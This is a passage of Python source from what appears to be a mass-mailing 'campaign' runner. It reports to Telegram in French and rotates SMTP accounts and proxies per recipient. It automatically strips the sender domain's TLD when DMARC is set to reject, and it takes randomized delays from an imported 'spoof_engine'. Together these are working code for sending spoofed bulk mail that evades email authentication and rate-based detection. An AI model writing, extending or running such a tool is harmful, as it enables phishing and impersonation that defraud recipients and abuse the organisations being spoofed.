        return result

    # Attempt 2: Stripped TLD
    stripped = _strip_tld(from_email)
    stripped_from = f"{from_name} <{stripped}>"
    time.sleep(0.3)  # Brief cooldown, not 2s
    ok2, err2 = _connect_and_send(stripped_from, user)

    if ok2:
        result["success"] = True
        result["mode"] = "strip"
        return result

    result["error"] = f"{err} / {err2}"
    return result


# ---------------------------------------------------------------------------
# Campaign Runner (async)
# ---------------------------------------------------------------------------
_running_campaigns: dict[int, bool] = {}


def is_campaign_running(campaign_id: int) -> bool:
    return _running_campaigns.get(campaign_id, False)


def stop_campaign(campaign_id: int):
    _running_campaigns[campaign_id] = False


async def run_campaign(
    campaign_id: int,
    db_path: str = DB_PATH,
    chat_id: int | None = None,
):
    """Run a campaign — send emails with SMTP rotation and rate limiting."""
    mgr = CampaignManager(db_path)
    camp = mgr.get_campaign(campaign_id)

    if not camp:
        send_telegram(f"CAMPAIGN #{campaign_id}: introuvable", chat_id)
        mgr.close()
        return

    smtp_list = mgr.get_smtp_for_campaign(campaign_id)
    if not smtp_list:
        send_telegram(f"CAMPAIGN #{campaign_id}: aucun SMTP configure", chat_id)
        mgr.close()
        return

    mgr.update_campaign_status(campaign_id, "running")
    _running_campaigns[campaign_id] = True

    rate = camp["rate_per_minute"] or 30
    delay = 60.0 / rate  # seconds between sends

    # Auto-strip TLD when DMARC p=reject
    campaign_from_email = camp["from_email"]
    tld_stripped = False
    if campaign_from_email and "@" in campaign_from_email:
        from_domain = campaign_from_email.split("@")[1]
        dmarc = check_dmarc_policy(from_domain)
        if dmarc.get("policy") == "reject":
            campaign_from_email = _strip_tld(campaign_from_email)
            tld_stripped = True

    send_telegram(
        f"CAMPAIGN #{campaign_id} LANCEE\n"
        f"Nom: {camp['name']}\n"
        f"Sujet: {camp['subject']}\n"
        f"From: {camp['from_name']} <{campaign_from_email}>"
        f"{' (TLD strippe — DMARC reject)' if tld_stripped else ''}\n"
        f"Destinataires: {camp['total_recipients']}\n"
        f"SMTP: {len(smtp_list)}\n"
        f"Rate: {rate}/min",
        chat_id,
    )

    smtp_idx = 0
    sent = 0
    failed = 0
    start_time = time.time()

    # Proxy rotation for campaign sends
    from .proxy_pool import ProxyPool
    proxy_pool = ProxyPool(db_path)
    proxy_count = proxy_pool.count_active()

    loop = asyncio.get_event_loop()

    while _running_campaigns.get(campaign_id, False):
        recipient = mgr.claim_recipient(campaign_id)
        if not recipient:
            break  # No more recipients

        # Pick SMTP (round-robin rotation)
        active_smtp = mgr.get_smtp_for_campaign(campaign_id)
        if not active_smtp:
            send_telegram(f"CAMPAIGN #{campaign_id}: tous les SMTP sont down!", chat_id)
            break

        smtp = active_smtp[smtp_idx % len(active_smtp)]
        smtp_idx += 1

        # Check daily limit
        if smtp["daily_sent"] >= smtp["daily_limit"]:
            mgr.deactivate_smtp(smtp["id"], "daily_limit_reached")
            continue

        # Pick proxy (round-robin, or None if no proxies)
        current_proxy = proxy_pool.get_next() if proxy_count > 0 else None

        # Send — with proxy fallback to direct if proxy fails
        _proxy = current_proxy
        result = await loop.run_in_executor(
            None,
            lambda: _send_one(
                smtp,
                camp["from_name"],
                campaign_from_email,
                recipient["email"],
                camp["subject"],
                camp["letter_html"],
                camp["letter_text"],
                envelope_from=smtp.get("from_email", "") or smtp["username"],
                reply_to=camp.get("reply_to", ""),
                proxy=_proxy,
            ),
        )

        # Fallback: if proxy failed, retry direct (no proxy)
        if not result["success"] and current_proxy and "Proxy" in result.get("error", ""):
            proxy_pool.mark_fail(current_proxy["id"], result["error"])
            result = await loop.run_in_executor(
                None,
                lambda: _send_one(
                    smtp,
                    camp["from_name"],
                    campaign_from_email,
                    recipient["email"],
                    camp["subject"],
                    camp["letter_html"],
                    camp["letter_text"],
                    envelope_from=smtp.get("from_email", "") or smtp["username"],
                    reply_to=camp.get("reply_to", ""),
                    proxy=None,
                ),
            )
            current_proxy = None  # Mark as direct send

        smtp_info = f"{smtp['provider']}:{smtp['host']}"
        proxy_label = f" via {current_proxy['host']}" if current_proxy else ""

        if result["success"]:
            mgr.mark_sent(recipient["id"], smtp_info + proxy_label)
            mgr.increment_smtp_daily(smtp["id"])
            sent += 1
            if current_proxy:
                proxy_pool.mark_success(current_proxy["id"])
        else:
            mgr.mark_failed(recipient["id"], result["error"], smtp_info + proxy_label)
            failed += 1
            if current_proxy and "timeout" in result["error"].lower():
                proxy_pool.mark_fail(current_proxy["id"], result["error"])
            # If auth fails, deactivate this SMTP
            if "AUTH FAIL" in result["error"]:
                mgr.deactivate_smtp(smtp["id"], result["error"])

        # Progress every 10 sends
        if (sent + failed) % 10 == 0 and (sent + failed) > 0:
            elapsed = time.time() - start_time
            rate_actual = sent / (elapsed / 3600) if elapsed > 0 else 0
            send_telegram(
                f"CAMPAIGN #{campaign_id}\n"
                f"Sent: {sent} | Failed: {failed}\n"
                f"Rate: {rate_actual:.0f}/h\n"
                f"SMTP actifs: {len(active_smtp)}",
                chat_id,
            )

        # Rate limiting with randomized timing
        try:
            from .spoof_engine import random_delay as spoof_delay
            await asyncio.sleep(spoof_delay(delay, jitter=0.5))
        except ImportError:
            await asyncio.sleep(delay)

    # Finished
    _running_campaigns.pop(campaign_id, None)
    status = "finished" if not mgr.claim_recipient(campaign_id) else "stopped"
    mgr.update_campaign_status(campaign_id, status)

    elapsed = time.time() - start_time
    stats = mgr.get_stats(campaign_id)

    send_telegram(
        f"=============================\n"
        f"  CAMPAIGN #{campaign_id} {status.upper()}\n"
        f"=============================\n\n"
        f"Nom: {camp['name']}\n"
        f"Sent: {stats.sent}\n"
        f"Failed: {stats.failed}\n"
        f"Pending: {stats.pending}\n"
        f"Time: {elapsed:.0f}s\n"
        f"=============================",
        chat_id,
    )

    mgr.close()
